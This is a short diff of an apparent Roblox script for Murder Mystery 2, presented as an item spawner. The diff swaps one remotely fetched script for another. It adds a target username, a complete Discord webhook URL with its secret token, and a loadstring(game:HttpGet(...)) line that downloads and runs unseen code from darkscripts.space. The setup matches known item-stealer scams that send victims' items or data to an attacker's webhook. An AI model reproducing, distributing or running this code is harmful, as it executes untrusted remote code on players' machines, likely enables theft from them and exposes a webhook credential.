@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/etherhub1/Mm2-/refs/heads/main/Mm2-item-spawner"))()
+Username = "sandro4342"
+Webhook = "https://discord.com/api/webhooks/1303276256657408020/cn-0C2jH1dEHAZXASZDOcMCpM3mfvvdDrdDLFzpxMY4oHEb643HDFdwrMOyQfuVB_CJK"
+
+loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
